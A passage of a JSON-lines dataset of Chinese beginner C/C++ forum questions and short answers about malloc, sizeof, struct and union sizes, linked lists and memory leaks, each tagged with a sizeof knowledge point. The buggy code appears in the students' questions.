class=\"hljs-string\"&gt;&amp;#34;Create list L1--&amp;gt;\\n&amp;#34;&lt;/span&gt;);\n    &lt;span class=\"hljs-built_in\"&gt;initlist&lt;/span&gt;(L1);\n    L1&amp;#61;&lt;span class=\"hljs-built_in\"&gt;creata_list&lt;/span&gt;(L1);\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;check L1\\n&amp;#34;&lt;/span&gt;);\n    &lt;span class=\"hljs-built_in\"&gt;printlist&lt;/span&gt;(L1);\n\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;Create list L2--&amp;gt;\\n&amp;#34;&lt;/span&gt;);\n    &lt;span class=\"hljs-built_in\"&gt;initlist&lt;/span&gt;(L2);\n    L2&amp;#61;&lt;span class=\"hljs-built_in\"&gt;creata_list&lt;/span&gt;(L2);\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;check L2\\n&amp;#34;&lt;/span&gt;);\n    &lt;span class=\"hljs-built_in\"&gt;printlist&lt;/span&gt;(L2);\n\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;MergeList list--&amp;gt;\\n&amp;#34;&lt;/span&gt;);\n    &lt;span class=\"hljs-built_in\"&gt;MergeList&lt;/span&gt;(L1,L2,&amp;amp;L3);\n    &lt;span class=\"hljs-built_in\"&gt;printlist&lt;/span&gt;(L3);\n\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["想请教一下在函数sqlist MergeList中，如果有重复的部分，最后运行出来结尾会有一个零（重复的数据只保留一个，但是该数据占用的内存没有释放），如何改进？", ["\n", "#", "define", " overflow -1", "\n", "#", "define", " ok 1", "\n", "#", "define", " ", "error", " 0", "\n", "#", "define", " maxsize 16", "\n", "#", "define", " increment 10", "\n", "#", "include", " ", "<stdio.h>", "\n", "#", "include", " ", "<stdlib.h>", "\n", "#", "include", " ", "<malloc.h>", "\n", "typedef", " ", "int", " status;\n", "typedef", " ", "int", " elemtype;\n", "typedef", " ", "struct", "\n{\n    elemtype *elem;\n    ", "int", " length;\n    ", "int", " listsize;\n} sqlist;\n\n", "//初始化 ", "\n", "status ", "initlist", "(sqlist &L)", "\n", "{\n    L.elem = (elemtype *)", "malloc", "(maxsize * ", "sizeof", "(elemtype));\n    ", "if", " (!L.elem)\n        ", "exit", "(overflow);  \n    L.length = ", "0", ";\n    L.listsize = maxsize;\n    ", "return", " ok;\n}\n\n", "//创建", "\n", "sqlist ", "creata_list", "(sqlist L)", "\n", "{\n    ", "int", " i=", "0", ",N;\n    ", "printf", "(", "\"input length you want -->\\n\"", ");\n    ", "scanf", "(", "\"%d\"", ",&N);\n    ", "while", "( i!= N )\n    {\n        ", "scanf", "(", "\"%d\"", ",&L.elem[i]);\n        i++;\n    }\n    L.length += N;\n    ", "return", " L;\n}\n\n", "//在指定位置插入数字 ", "\n", "status ", "insertlist", "(sqlist &L, ", "int", " i, elemtype e)", "\n", "{\n    ", "if", " (i < ", "1", " || i > L.length)\n        ", "return", " error;\n    elemtype *p;\n    ", "int", " j;\n    ", "if", " (L.length >= L.listsize)\n    {\n        p = (elemtype *)", "realloc", "(L.elem, (L.listsize + increment) * ", "sizeof", "(elemtype));\n        ", "if", " (!p)\n            ", "exit", "(overflow);\n        L.elem = p;\n        L.listsize += increment;\n    }\n    ", "for", " (j = L.length - ", "1", "; j >= i - ", "1", "; --j)\n        L.elem[j + ", "1", "] = L.elem[j];\n    L.elem[j + ", "1", "] = e;\n    L.length++;\n    ", "return", " ok;\n}\n\n", "//输出顺序表 ", "\n", "void", " ", "printlist", "(sqlist L)", "\n", "{\n    ", "int", " i;\n    ", "for", " (i = ", "0", "; i < L.length; i++)\n        ", "printf", "(", "\"%d \"", ", L.elem[i]);\n    ", "printf", "(", "\"\\n\"", ");\n}\n\n", "//删除相应位置数据 ", "\n", "status ", "dellist", "(sqlist &L, ", "int", " i, elemtype &e)", "\n", "{\n    ", "int", " j;\n    ", "if", " (i < ", "1", " || i > L.length)\n        ", "return", " error;\n    e = L.elem[i - ", "1", "];\n    ", "for", " (j = i; j < L.length; j++)\n        L.elem[j - ", "1", "] = L.elem[j];\n    --L.length;\n    ", "return", " ok;\n}\n\n", "//获取相应位置数据 ", "\n", "int", " ", "LocatedList", "(sqlist &L,", "int", " j)", "\n", "{\n     \n    ", "if", "(j<", "1", " || j>L.length){\n        ", "printf", "(", "\"The specified location does not exist!\"", ");\n        ", "return", " error;\n    }\n\n    ", "return", " L.elem[j", "-1", "] ;   ", "//直接返回 ", "\n }\n \n", "//获取相关值的位置", "\n", "int", " ", "GetList", "(sqlist L,elemtype temp)", "\n", "{\n    ", "int", " j;\n    ", "for", "( j=", "0", " ; j<L.length ; j++){\n    ", "if", "(L.elem[j]==temp)  {\n    ", "return", " j;\n    ", "break", ";\n}\n}\n    ", "printf", "(", "\"dont exist!\\n\"", ");\n    ", "return", " error;\n } \n \n", "//合并集合 ", "\n", "sqlist ", "MergeList", "(sqlist La,sqlist Lb,sqlist *Lc)", " \n", "{\n    Lc->length=La.length+Lb.length;\n    Lc->listsize=Lc->length;\n    \n    elemtype *pa=La.elem,*pb=Lb.elem,*pc;\n    pc=(elemtype*)", "malloc", "(Lc->length*", "sizeof", "(elemtype));            ", "//申请新的内存", "\n    Lc->elem=pc; \n    elemtype *pa_last,*pb_last;                                            ", "//定义指向初地址和末地址的指针", "\n    \n    pa_last=La.elem+La.length", "-1", ";\n    pb_last=Lb.elem+Lb.length", "-1", ";\n    \n    ", "while", "((pa <= pa_last)&&(pb<=pb_last)){\n        ", "if", "(*pa < *pb) *pc++ = *pa++;\n        ", "else", " ", "if", "(*pa > *pb) *pc++ = *pb++;\n        ", "else", " ", "if", "(*pa = *pb) { *pc++ = *pa++; *pb++; };                ", "//顺序存储，重复只存pa，pa，pb都后退 ", "\n    }\n    \n    ", "while", "(pa <= pa_last) *pc++ = *pa++;\n    ", "while", "(pb <= pb_last) *pc++ = *pb++;                            ", "//判空，不为空继续赋值，直到指向最后指针。", "\n    ", "return", " *Lc; \n}\n\n", "//合并顺序表", "\n", "sqlist ", "CombineList", "(sqlist L1,sqlist L2,sqlist *L3)", "\n", "{\n    L3->length=L1.length+L2.length;\n    L3->listsize=L3->length;\n    \n    elemtype *p1=L1.elem,*p2=L2.elem,*p3;\n    p3=(elemtype*)", "malloc", "(L3->length*", "sizeof", "(elemtype));            ", "//申请新的内存", "\n    L3->elem=p3; \n    elemtype *p1_last,*p2_last;                                            ", "//定义指向初地址和末地址的指针", "\n    \n    p1_last=L1.elem+L1.length", "-1", ";\n    p2_last=L2.elem+L2.length", "-1", ";\n    \n    ", "while", " (p1 <= p1_last && p2 <= p2_last) {\n        ", "if", "( *p1<=*p2 ) *p3++ = *p1++;\n        ", "else", " *p3++ = *p2++;\n    }\n    ", "while", "(p1 <= p1_last) *p3++ = *p1++;\n    ", "while", "(p2 <= p2_last) *p3++ = *p2++;                            ", "//判空，不为空继续赋值，直到指向最后指针。", "\n    ", "return", " *L3;\n } \n\n", "int", " ", "main", "()", "\n", "{\n    sqlist LL;\n    elemtype x,data;\n    ", "int", " r, i,j;\n    ", "if", " (!", "initlist", "(LL)) ", "//初始化", "\n        ", "return", " error;\n\n    ", "printf", "(", "\"input data-->\\n\"", ");       ", "//创建 ", "\n    LL=", "creata_list", "(LL);\n    \n    \n    ", "printf", "(", "\"check Order table-->\\n\"", ");       ", "//显示 ", "\n    ", "printlist", "(LL); \n    \n    ", "printf", "(", "\"value index-->\\n\"", ");  ", "//插入", "\n    ", "scanf", "(", "\"%d %d\"", ", &x, &r);\n    ", "insertlist", "(LL, r, x);\n    ", "printlist", "(LL);\n    \n    ", "printf", "(", "\"index-->\\n\"", ");  ", "//删除", "\n    ", "scanf", "(", "\"%d\"", ", &r);\n    ", "dellist", "(LL,r,x);\n    ", "printlist", "(LL); \n    \n    ", "printf", "(", "\"input locate-->\\n\"", ");\n    ", "scanf", "(", "\"%d\"", ",&j);\n    data=", "LocatedList", "(LL,j);\n    ", "printf", "(", "\"the elem[%d] = %d\\n\"", ",j,data);\n    \n    ", "printf", "(", "\"input value-->\\n\"", ");\n    elemtype temp,place;\n    ", "scanf", "(", "\"%d\"", ",&temp);\n    place=", "GetList", "(LL, temp);\n    ", "printf", "(", "\"%d = the elem[%d]\\n\"", ",temp,place+", "1", ");\n    \n    sqlist La,Lb,Lc;                    ", "//合并集合 ", "\n    ", "printf", "(", "\"Create list La-->\\n\"", ");\n    ", "initlist", "(La);\n    La=", "creata_list", "(La);\n    ", "printf", "(", "\"check La\\n\"", ");\n    ", "printlist", "(La);\n    ", "printf", "(", "\"Create list Lb-->\\n\"", ");\n    ", "initlist", "(Lb);\n    Lb=", "creata_list", "(Lb);\n    ", "printf", "(", "\"check Lb\\n\"", ");\n    ", "printlist", "(Lb);\n    ", "printf", "(", "\"combine list-->\\n\"", ");\n    ", "MergeList", "(La,Lb,&Lc);\n    ", "printlist", "(Lc);\n    \n    sqlist L1,L2,L3;                    ", "//合并有序表 ", "\n    ", "printf", "(", "\"Create list L1-->\\n\"", ");\n    ", "initlist", "(L1);\n    L1=", "creata_list", "(L1);\n    ", "printf", "(", "\"check L1\\n\"", ");\n    ", "printlist", "(L1);\n    ", "printf", "(", "\"Create list L2-->\\n\"", ");\n    ", "initlist", "(L2);\n    L2=", "creata_list", "(L2);\n    ", "printf", "(", "\"check L2\\n\"", ");\n    ", "printlist", "(L2);\n    ", "printf", "(", "\"combine list-->\\n\"", ");\n    ", "MergeList", "(L1,L2,&L3);\n    ", "printlist", "(L3);\n    \n}\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;如果是内存分配的错&amp;#xff0c;加个头文件#include&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言：创建链表时，内存申请出错", ["创建链表中，在申请结点的内存时出现了问题", "\n", "#", "include", " ", "<stdio.h>", "\n", "#", "include", " ", "<string.h>", "\n\n", "#", "define", " MAXSIZE 20", "//字符串的最大长度", "\n", "#", "define", " T 3", "//阈值", "\n\n", "typedef", " ", "struct", " ", "data_splited", " {", "//数据包的数据域", "\n    ", "char", "* s;\n    ", "int", " length;\n    ", "char", "* p;\n}Data_splited;\n", "typedef", " ", "struct", " ", "list_splited", " {", "//将字符串切分后的数据包", "\n    Data_splited data;\n    ", "struct", " ", "list_splited", "* next;\n}List_Splited;\n", "typedef", " ", "struct", "//创建函数返回的类型，其返回的字串最多为20个", "\n{\n    ", "char", " S[", "10", "][MAXSIZE];\n}Result_split;\n![img](https:", "//img-mid.csdnimg.cn/release/static/image/mid/ask/943192212936180.png \"#left\")", "\n\n\nList_Splited* ", "Split", "(", "char", "*);\n\n\n\n", "int", " ", "main", "()\n{\n    List_Splited* result = ", "Split", "(", "\"helloworld\"", ");\n\n    ", "return", " ", "0", ";\n}\n\n\nList_Splited* ", "Split", "(", "char", "* str)\n{\n    ", "if", " (str == ", "NULL", ")\n    {\n        ", "printf", "(", "\"您输入的字符为空!\"", ");\n        ", "return", ";\n    }\n    ", "else", "\n    {\n        Result_split result = ", "split", "(str);\n        ", "int", " length = ", "strlen", "(str);\n        ", "int", " n = length / T;\n\n        ", "//创建头、尾结点", "\n        List_Splited* temp;\n        ", "int", " i = ", "1", ";\n        List_Splited* head = ", "NULL", ";\n        List_Splited* tail = ", "NULL", ";\n        temp = (List_Splited*)", "malloc", "(", "sizeof", "(List_Splited));\n        head = temp;\n        temp->data.s = ", "NULL", ";\n        ", "//数据输入", "\n        ", "strcpy_s", "(temp->data.s, ", "10", ", result.S[", "0", "]);\n        temp->data.length = length;\n        temp->data.p = str;\n        ", "//", "\n        head->next = ", "NULL", ";\n        tail = temp;\n        temp = ", "NULL", ";\n        ", "while", " (i < n)\n        {\n            temp = (List_Splited*)", "malloc", "(", "sizeof", "(List_Splited));\n            tail->next = temp;\n            ", "//数据输入", "\n            ", "strcpy_s", "(temp->data.s, ", "10", ", result.S[i]);\n            temp->data.length = length;\n            temp->data.p = str;\n            ", "//", "\n            temp->next = ", "NULL", ";\n            tail = temp;\n            temp = ", "NULL", ";\n            i++;\n        }\n        ", "return", " head;\n    }\n}\n", "\n", "申请内存前", "\n", "\n", "申请内存后", "\n"]], "Tag": "程序设计"}
{"Answer": "内存对齐的原因。\n参考:http://m.jb51.net/article/45406.htm", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["新手提问，关于C语言共用体字节数", ["遇到有关共用体字节数的题目，于是我用写了一小段代码输出共用体的字节数，但发现了一点问题：", "\n#include", "\n#include", "\n#include", "\nint main(){", "\n    union aa{", "\n        int x,y;", "\n        char c[6];", "\n    }a;", "\n    printf(\"%d\", sizeof(a));", "\n    return 0;", "\n}", "\n\n", "当共用体只有字符数组c时，共用体字节数为6", "\n\n", "只有x,y时，字节数为4", "\n\n", "问题来了：", "\n当两者都有时，按照理论，共用体字节数应该为6，但运行结果是8", "\n\n", "这是为什么呢？"]], "Tag": "程序设计"}
{"Answer": "虽然基本问题只是少了个等号，但希望楼主学到的不只是语法，而是 C 语言的风格与习惯，以下逐步地指出能改善的地方：\r\n\r\n### 1. array后方少了个等号\r\n```c\r\nif ((array = (int *)...\r\n``` \r\n### 2. C99 版本后，不建议将malloc返回值转换，因此这样写即可：\r\n```c\r\n if ((array = malloc...\r\n``` \r\n请参考 [Do I cast the result of malloc?](https://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc \"\")\r\n### 3. NULL的判断可利用 Logical NOT 运算符 (即惊叹号 !) 来省略：\r\n```c\r\nif (!(array = malloc(...\r\n```\r\n### 4. 名称 count 一般不会用于 for loop 的计数器，而是使用常见的 i (index)\r\n请参考 [Linux Coding Style](https://github.com/torvalds/linux/blob/master/Documentation/process/coding-style.rst#user-content-4-naming \"\")\r\n### 5. 同上，count, len, size... 等名称适合用于指出数组大小\r\n### 6. 英文中，cannot 是较常规的写法\r\n\r\n---\r\n\r\n总结以上代码：\r\n```c\r\n#include&lt;stdio.h&gt;\r\n#include&lt;stdlib.h&gt;\r\n\r\nint main(void)\r\n{\r\n    int count = 10;\r\n    int i, *array;\r\n    if (!(array = malloc(count * sizeof(int)))) {\r\n        printf(\"cannot success!\\n\");\r\n        exit(1);\r\n    }\r\n    for (i = 0; i &lt; count; i++)\r\n        array[i] = i;\r\n    for (i = 0; i &lt; count; i++)\r\n        printf(\"%2d \", array[i]);\r\n\r\n    return 0;\r\n}\r\n\r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言中malloc动态分配空间的使用", ["求解答，我看不出来怎么解决，谢谢！", "\n\n", "#include<stdio.h>\n#include<stdlib.h>\n\nint main(void)\n{\n    int count, *array;\n    if ((array(int *)malloc (10 * sizeof(int))) == NULL)\n    {\n        printf(\"can not success!\\n\");\n        exit(1);\n    }\n    for (count = 0; count < 10; count++)\n        array[count] = count;\n    for (count = 0; count < 10; count++)\n        printf(\"%2d \", array[count]);\n    return 0;\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;运气&amp;#xff0c;因c/c&amp;#43;&amp;#43;不是内存安全的语言&amp;#xff0c;所以你可以这样&lt;br /&gt;rust就不可以了&amp;#xff0c;会严格检测内存边界&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["分配的内存int[8]为什么后面的内存还能读写", ["\n", "#", "include", " ", "<iostream>", "\n", "#", "include", " ", "<exception>", "\n\n", "using", " ", "namespace", " std;\n\n", "class", " ", "test", "{\n", "public", ":\n    ", "int", " *p;\n    ", "test", "(){\n        ", "this", "->p = ", "new", " ", "int", "[", "8", "];\n    }\n    ~", "test", "(){\n        ", "if", " (p != ", "nullptr", ")\n            ", "delete", " [] ", "this", "->p;\n    }\n};\n\n\n", "int", " ", "main", "()", "{\n    test c;\n    cout<<", "sizeof", "(c.p)<<endl;\n    ", "try", " {\n        ", "for", " (", "int", " i = ", "0", "; i < ", "100", "; i++){\n            c.p[i] = i + ", "100", ";\n        }\n        ", "for", " (", "int", " i = ", "0", "; i < ", "100", "; i++){\n            cout<<c.p[i]<<", "\" \"", ";\n        }\n        cout<<endl;\n    }", "catch", "(", "const", " ", "char", "* msg){\n        cerr << msg << endl;\n    }\n}\n", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;使用malloc动态分配的内存要主动free才能释放&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["【C++】为啥会内存泄露", ["先来看这个类定义：", "\n", "class", " ", "String", "\n{\n", "protected", ":\n    ", "struct", " ", "StrNode", "\n    {\n        ", "int", " ref;  ", "// 引用计数", "\n        ", "int", " len;  ", "// 字符串的长度", "\n        ", "int", " size; ", "// 柔性数组的容量", "\n        ", "char", " data[];\n    };\n", "private", ":\n    StrNode* pstr;\n}\n\n\n下面是构造函数：\n\n```c++\n", "String", "(", "const", " ", "char", "* p = ", "NULL", ") :", "pstr", "(", "NULL", ")\n    {\n        ", "if", " (p != ", "NULL", ")\n        {\n            ", "int", " sz = ", "strlen", "(p);\n            pstr = (StrNode*)", "malloc", "(", "sizeof", "(StrNode) + sz * ", "2", " + ", "1", ");\n            pstr->ref = ", "1", ";\n            pstr->len = sz;\n            pstr->size = sz * ", "2", ";\n            ", "strcpy", "(pstr->data, p);\n        }\n    }\n    ~", "String", "()    ", "//析构函数", "\n    {\n        ", "if", " (pstr != ", "NULL", " && --pstr->ref == ", "0", ")\n        {\n            ", "free", "(pstr);\n        }\n        pstr = ", "NULL", ";\n    }\n    ", "String", "(", "const", " ", "String", "& str) :", "pstr", "(", "NULL", ")    ", "//拷贝构造函数", "\n    {\n        ", "if", " (str.pstr != ", "NULL", ")\n        {\n            pstr = str.pstr;\n            pstr->ref += ", "1", ";\n        }\n    }\n\n", "\n", "主函数调用：  为了实现", "s1", " = ", "s1", " + ", "s4", "这个功能\n", "\n", "int", " ", "main", "()", "\n", "{\n    ", "String", " ", "s1", "(", "\"yhping\"", ")", ";\n    ", "String", " ", "s2", "(s1)", ";\n\n    ", "String", " ", "s3", "(", "\"hello\"", ")", ";\n    ", "String", " ", "s4", "(", "\"hahaha\"", ")", ";\n\n    s1 = s1 + s4;\n}\n\n", "\n", "\n\n\n下面是为了完成s1 = s1 + s4而重写的+函数\n", "String", " operator+(", "const", " ", "String", "& s) ", "const", "\n    {\n        ", "if", " (pstr == ", "NULL", " && s.pstr == ", "NULL", ")\n        {\n            ", "return", " ", "String", "();\n        }\n        ", "else", " ", "if", " (pstr != ", "NULL", " && s.pstr == ", "NULL", ")\n        {\n            ", "return", " *this;\n        }\n        ", "else", " ", "if", " (pstr == ", "NULL", " && s.pstr != ", "NULL", ")\n        {\n            ", "return", " s;\n        }\n        ", "else", "\n        {\n            ", "int", " total = (pstr->len + s.pstr->len) * ", "2", ";\n            StrNode* newsp = (StrNode*)malloc(sizeof(StrNode) + total + ", "1", ");\n            strcpy(newsp->data, pstr->data);\n            strcat(newsp->data, s.pstr->data);\n            newsp->ref = ", "1", ";\n            newsp->len = pstr->len + s.pstr->len;\n            newsp->size = total;\n            ", "return", " ", "String", "(newsp);\n\n\n            ", "/*int total = (pstr->len + s.pstr->len) * 2;    //这块代码我写的   老师说会内存泄漏   让我自己去想\n            char* sp = (char*)malloc(total + 1);\n            strcpy(sp, pstr->data);\n            strcat(sp, s.pstr->data);\n            return String(sp);*/", "\n        }\n    }\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;parr是个数组指针&amp;#xff0c;每个元素都是指针&amp;#xff0c;指针的sizeof值就是8哈。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["sizeof(d[1]),（d[1]是指针数组），一直等于8", ["\n", "无论如何改，每一组都是8", "很奇怪，咋么会这样。如图应为20or16"]], "Tag": "程序设计"}
{"Answer": "```\r\n*(p+1)='b';\r\n*(p+2)='\\0'; //要终止这个字符串\r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C 给指针使用malloc分配的内存空间，在输出内容时出现乱码", ["char *p=(char *)malloc(2*sizeof(char));", "\n    *p='a';", "\n    *(p+1)='b';", "\n\n", "printf(\"len=%d [%s]\\n\",strlen(p),p);\n\nfree(p);\ngetch();\n\n在vc++环境下运行结果：\nlen=6 [ab]\n", "\n\n", "\n\n", "点击exe文件运行结果：\nlen=22 [ab葺葺葺葺葺?鷳?]\n", "\n\n", "\n\n", "为什么点击exe运行会有乱码产生？有大神知道原因吗？"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;if(temp-&amp;gt;data.category&amp;#61;&amp;#61;category)&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言单链表系统错误", ["查找 修改 删除 找不到", "\n", "#include <stdio.h>", "#include <stdlib.h>", "struct goods", "{", "    char number[6];", "    char category[12];", "    int amount;", "};", "struct LNode", "{", "    struct goods data; //数据域", "    struct LNode *next;  //指针域", "};", "typedef struct LNode LinkList;", "\n", "void meum();", "void choice(int *stop,LinkList *L);", "void creat_node(LinkList *L);", "void show_goods(LinkList *L);", "void search_goods(LinkList *L);", "void delete_goods(LinkList *L);", "void modify_goods(LinkList *L);", "\n", "int main()", "{", "    int i;", "    LinkList *L=NULL;", "    L=(LinkList *)malloc(sizeof(LinkList));", "    if(L==NULL)", "    {", "        printf(\"分配头节点内存出错!\");", "        exit(1);", "    }", "    memset(L,0,sizeof(LinkList));", "    L->next=NULL;", "\n", "int", " stop=", "1", ";\n", "while", "(", "1", ")\n{\n    ", "meum", "();\n    ", "choice", "(&stop,L);\n    ", "if", "(stop==", "0", ")\n        ", "break", ";\n    ", "printf", "(", "\"\\n     下一步操作:\"", ");\n    ", "printf", "(", "\"\\n     1.返回主界面\"", ");\n    ", "printf", "(", "\"\\n     2.退出系统\"", ");\n    ", "printf", "(", "\"\\n     请输入操作:\"", ");\n    ", "scanf", "(", "\"%d\"", ",&i);\n    ", "if", "(i==", "2", ")\n        ", "break", ";\n}\n", "return", " ", "0", ";\n", "\n", "}", "\n", "void creat_node(LinkList *L)", "{", "    LinkList *node=NULL;", "    LinkList *temp=L->next;  //作为链表连接的中间点", "    node=(LinkList *)malloc(sizeof(LinkList));  //分配内存", "    if(node==NULL)", "    {", "        printf(\"分配普通节点内存出错!\");", "        exit(1);", "    }", "    memset(node,0,sizeof(LinkList));", "    printf(\"\\n请输入物品序号:\");", "    scanf(\"%s\",  node->data.number);", "    printf(\"\\n请输入物品种类:\");", "    scanf(\"%s\",node->data.category);", "    printf(\"\\n请输入物品数量:\");", "    scanf(\"%d\",&node->data.amount);", "    L->next=node;", "    node->next=temp;", "}", "\n", "void show_goods(LinkList *L)", "{", "    LinkList *p=L->next;", "    int i=0;", "    printf(\"\\n  **************************      \\n\");", "    printf(\"            物品信息                \\n\");", "    printf(\"    **************************      \\n\");", "    printf(\"      序号    种类     数量         \\n\");", "    while(p)", "    {", "        printf(\"      %s      %s      %d     \\n\",p->data.number,p->data.category,p->data.amount);", "        i++;", "        p=p->next;", "    }", "}", "\n", "void search_goods(LinkList *L)", "{", "    int x=0;", "    char number;", "    char category[12];", "    LinkList *temp;", "    temp=L->next;", "    while(1)", "    {", "        printf(\"\\n    请选择:\");", "        printf(\"\\n    1.按序号查找!\");", "        printf(\"\\n    2.按种类查找!\");", "        printf(\"\\n    请输入选择:\");", "        scanf(\"%d\",&x);", "        if(x==1 || x==2)", "            break;", "        else", "            printf(\"\\n   输入错误,请重新输入!\");", "    }", "    if(x==1)", "    {", "        printf(\"\\n    请输入要查找物品的序号:\");", "        scanf(\"%s\",&number);", "        while(temp->data.number!=number && temp->next!=NULL)", "        {", "            temp=temp->next;", "        }", "        if(temp->data.number==number)", "        {", "            printf(\"\\n     已经找到物品的信息!\");", "            printf(\"\\n   序号:%s  种类:%s  数量:%d\",temp->data.number,temp->data.category,temp->data.amount);", "        }", "        else", "        {", "            printf(\"\\n     没有查找到物品!\");", "        }", "    }", "    else if(x==2)", "    {", "        printf(\"\\n     请输入要查找物品的种类:\");", "        scanf(\"%s\",category);", "        while(strcmp(temp->data.category,category)!=0 && temp->next!=NULL)", "        {", "            temp=temp->next;", "        }", "        if(temp->data.category==category)", "        {", "            printf(\"\\n     已经找到物品的信息!\");", "            printf(\"\\n   序号:%s  种类:%s  数量:%d\",temp->data.number,temp->data.category,temp->data.amount);", "        }", "        else", "        {", "            printf(\"\\n     没有要查找到物品!\");", "        }", "\n", "}\n", "\n", "}", "\n", "void delete_goods(LinkList *L)", "{", "    int x=0;", "    char number;", "    char category[12];", "    LinkList *temp,*pre;", "    temp=L->next;", "    while(1)", "    {", "        printf(\"\\n    请选择:\");", "        printf(\"\\n    1.按序号删除!\");", "        printf(\"\\n    2.按种类删除!\");", "        printf(\"\\n    请输入选择:\");", "        scanf(\"%d\",&x);", "        if(x==1 || x==2)", "            break;", "        else", "            printf(\"\\n   输入错误,请重新输入!\");", "    }", "    if(x==1)", "    {", "        printf(\"\\n    请输入要删除的物品序号:\");", "        scanf(\"%s\",number);", "        while(temp->data.number!=number && temp->next!=NULL)", "        {", "            pre=temp;", "            temp=temp->next;", "        }", "        if(temp->data.number==number)", "        {", "            pre->next=temp->next;", "            free(temp);", "        }", "        else", "        {", "            printf(\"\\n    没有所要删除的物品序号!\");", "        }", "    }", "    else if(x==2)", "        printf(\"\\n     请输入要删除的物品种类:\");", "    scanf(\"%s\",category);", "    while(strcmp(temp->data.category,category)!=0 && temp->next!=NULL)", "    {", "        pre=temp;", "        temp=temp->next;", "    }", "    if(strcmp(temp->data.category,category)==0)", "    {", "        pre->next=temp->next;", "        free(temp);", "    }", "    else", "    {", "        printf(\"\\n     没有要删除的物品种类!\");", "    }", "}", "\n", "void choice(int *stop,LinkList *L)", "{", "    int num;", "    printf(\"\\n\\n          请输入菜单选项:\");", "    scanf(\"%d\",&num);", "    switch (num)", "    {", "    case 0:", "        *stop=0;", "        break;", "    case 1:", "        show_goods(L);", "        break;", "    case 2:", "        search_goods(L);", "        break;", "    case 3:", "        creat_node(L);", "        break;", "    case 4:", "        delete_goods(L);", "        break;", "    case 5:", "        modify_goods(L);", "        break;", "    default:", "        printf(\"      请在0-5中间选择\\n\");", "    }", "}", "\n", "void meum()", "{", "    printf(\"\\n   *****************************   \\n\");", "    printf(\"         物品信息管理系统          \\n\");", "    printf(\"   *****************************   \\n\");", "    printf(\"           系统菜单功能            \\n\");", "    printf(\"   *****************************   \\n\");", "    printf(\"          1.浏览物品信息           \\n\");", "    printf(\"          2.查找物品信息           \\n\");", "    printf(\"          3.添加物品信息           \\n\");", "    printf(\"          4.删除物品信息           \\n\");", "    printf(\"          5.修改物品信息           \\n\");", "    printf(\"          0.退出系统               \\n\");", "}", "\n", "void modify_goods(LinkList *L)", "{", "    int x=0;", "    char num;", "    char category[12];", "    LinkList *temp;", "    temp=L->next;", "    while(1)", "    {", "        printf(\"\\n    请选择:\");", "        printf(\"\\n    1.知道要修改物品的序号!\");", "        printf(\"\\n    2.知道要修改物品的种类!\");", "        printf(\"\\n    请输入选择:\");", "        scanf(\"%d\",&x);", "        if(x==1 || x==2)", "            break;", "        else", "            printf(\"\\n   输入错误,请重新输入!\");", "    }", "    if(x==1)", "    {", "        printf(\"\\n    请输入要修改物品的序号:\");", "        scanf(\"%s\",num);", "        while(temp->data.number!=num && temp->next!=NULL)", "        {", "            temp=temp->next;", "        }", "        if(temp->data.number==num)", "        {", "            printf(\"\\n     已经找到要修改物品的信息!\");", "        }", "        else", "        {", "            printf(\"\\n    没有要修改物品的序号!\");", "        }", "    }", "    else if(x==2)", "    {", "        printf(\"\\n     请输入要修改物品的种类:\");", "        scanf(\"%s\",category);", "        while(strcmp(temp->data.category,category)!=0 && temp->next!=NULL)", "        {", "            temp=temp->next;", "        }", "        if(strcmp(temp->data.category,category)==0)", "        {", "            printf(\"\\n     已经找到要修改物品的信息!\");", "        }", "        else", "        {", "            printf(\"\\n     没有要修改物品的种类!\");", "        }", "    }", "    printf(\"\\n     ************************\");", "    printf(\"\\n   序号:%s  种类:%s  数量:%d\",temp->data.number,temp->data.category,temp->data.amount);", "    do", "    {", "        printf(\"\\n     请选择:\");", "        printf(\"\\n     1.修改序号!\");", "        printf(\"\\n     2.修改种类!\");", "        printf(\"\\n     3.修改数量!\");", "        printf(\"\\n     请输入选择:\");", "        scanf(\"%d\",&x);", "    }", "    while(x<1 || x>3);", "    if(x==1)", "    {", "        printf(\"\\n     请输入修改后的序号:\");", "        scanf(\"%s\",temp->data.number);", "    }", "    if(x==2)", "    {", "        printf(\"\\n     请输入修改后的种类:\");", "        scanf(\"%s\",temp->data.category);", "    }", "    if(x==3)", "    {", "        printf(\"\\n     请输入修改后的数量:\");", "        scanf(\"%d\",&temp->data.amount);", "    }", "\n", "}"]], "Tag": "程序设计"}
